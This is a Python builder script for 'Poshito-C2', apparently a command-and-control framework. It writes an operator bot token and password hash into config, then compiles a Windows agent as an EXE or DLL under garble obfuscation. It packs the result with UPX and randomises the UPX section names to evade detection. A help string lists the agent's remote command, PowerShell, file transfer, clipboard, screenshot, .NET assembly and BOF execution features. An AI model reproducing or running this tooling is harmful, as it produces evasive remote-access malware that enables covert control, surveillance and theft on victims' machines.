#!/usr/bin/env python3
 
import string
import secrets
import hashlib
import argparse
import subprocess


poshito_help = """
/info       Send information 
/cmd        Execute a command               < command >
/iex        Execute a Powershell command    < powershell command >
/showdir    Show directory content          < directory path >
/down       Download a file                 < file path >
/up         Upload a file                   < file to upload >
/clip       Get clipboard content
/screen     Get screenshot
/asm        Execute .NET assembly           < (assembly file | assembly hash) + assembly arguments >
/bof        Execute BOF                     < bof file + bof arguments >    
/die        Kill agent
/sleep      Change sleep time               < seconds > < jitter % >
"""

output_exe = "Poshito.exe"
output_dll = "Poshito.dll"
pre_compile = "cd Agent &&"
compile_exe = f"""
GOOS=windows GOARCH=amd64 garble build -o ../{output_exe}
"""
compile_dll = f"""
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 garble build -buildmode=c-shared -o ../{output_dll} .
"""
upx_cmd = "upx -9 {}"
dll_go_file = """
package main
import "C"
//export {0}
func {0}() {{
    main()
}}
"""


def generate_random_string(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    random_string = ''.join(secrets.choice(characters) for _ in range(length))
    return random_string


def calc_md5(input):
    encoded_string = input.encode('utf-8')
    md5_hash = hashlib.md5()
    md5_hash.update(encoded_string)
    return md5_hash.hexdigest()


def write_config_file(name, content):
    try:
        with open("Agent/Config/" + name, "wt") as f:
            f.write(content)
    except Exception:
        print("[-] ERROR: Could not write config file:", name)
        quit(1)


def main():
    parser = argparse.ArgumentParser(prog="build", description="Poshito-C2 agent builder")

    parser.add_argument("bot_token", help="Bot token")
    parser.add_argument("password", help="Operator password")
    parser.add_argument("format", help="Payload format", choices=["exe", "dll"])
    parser.add_argument("-nx", "--no-upx", action="store_true", help="don't UPX")
    parser.add_argument("-ns", "--no-upx-sec-obf", action="store_true", 
                        help="don't obfuscate UPX section names")
    parser.add_argument("-ng", "--no-garble", action="store_true", 
                        help="don't use Garble (use standard Go compiler)")
    parser.add_argument("-en", "--export-name", metavar="<name>", 
                        help="dll export name (default: DllRegisterServer)", 
                        default="DllRegisterServer")
    parser.add_argument("-st", "--sleep-time",
                        help="time to sleep between callbacks", default="5")
    parser.add_argument("-sj", "--sleep-jitter", metavar="<percent (%)>", 
                        help="sleep time jitter in percent", default="0")
    args = parser.parse_args()
    
    # Prepare compilation command line and stuff
    if args.format == "exe":
        compile_cmd = pre_compile + compile_exe
        output_file = output_exe
    elif args.format == "dll":
        compile_cmd = pre_compile + compile_dll
        output_file = output_dll
        with open("Agent/Dll.go", "wt") as f:
            f.write(dll_go_file.format(args.export_name))
    if args.no_garble:
        compile_cmd = compile_cmd.replace("garble", "go")

    # Write configuration files
    write_config_file("bot_token", args.bot_token)
    write_config_file("pass_md5", calc_md5(args.password))
    write_config_file("marker", generate_random_string(30))
    write_config_file("sleep_time", args.sleep_time)
    write_config_file("sleep_time_jitter", args.sleep_jitter)

    # Compile
    ret = subprocess.run(compile_cmd, shell=True)
    if ret.returncode != 0:
        print("[-] ERROR: Could not compile")
        quit(1)
    else:
        print(f"[+] Compiled successfully")

    # Pack UPX
    if not args.no_upx:
        
        upx_sections = {
            b"UPX0": generate_random_string(4).encode(),
            b"UPX1": generate_random_string(4).encode(),
            b"UPX2": generate_random_string(4).encode(),
            b"UPX!": generate_random_string(4).encode(),
        }
        ret = subprocess.run(upx_cmd.format(output_file), shell=True)
        if ret.returncode != 0:
            print("[-] ERROR: Could not UPX")
            quit(1)
        else:
            print(f"[+] UPXed successfully")
        
        # Obfuscate UPX sections
        if not args.no_upx_sec_obf:
            try:
                with open(output_file, "rb") as f:
                    agent = f.read()
                for section in upx_sections:
                    agent = agent.replace(section, upx_sections[section])
                with open(output_file, "wb") as f:
                    f.write(agent)
                print("[+] Obfuscated UPX section names")
            except:
                print("[-] ERROR: Could not obfuscate UPX section names")
                quit(1)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        quit()